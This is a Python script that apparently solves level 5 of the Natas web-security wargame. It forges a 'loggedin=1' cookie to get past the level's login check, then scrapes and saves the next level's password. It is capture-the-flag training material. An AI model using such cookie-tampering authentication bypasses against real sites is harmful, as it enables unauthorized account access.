"""
natas5: cookie value
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 5

def solve(url: str, login: LevelLogin) -> Optional[str]:
    with requests.session() as session:
        # _ = session.get(URL, auth=LOGIN)

        # This level requires a cookie set to a "true" value.
        session.cookies.set("loggedin", "1")

        response = session.get(url, auth=login)
        # print(response.text)

        soup = BeautifulSoup(response.text, "html.parser")

        # overkill, since there's only one password in the page
        candidate_passwords = re.findall(PW_FORMAT, soup.find("div", attrs={"id": "content"}).text)
        natas6_password = try_level_login(LEVEL + 1, candidate_passwords, session=session)

    return natas6_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas6_password = solve(url, login)

    if natas6_password:
        print("natas6:", natas6_password)
        store_level_password(LEVEL + 1, natas6_password)
    else:
        exit("Failed to get password for the next level.")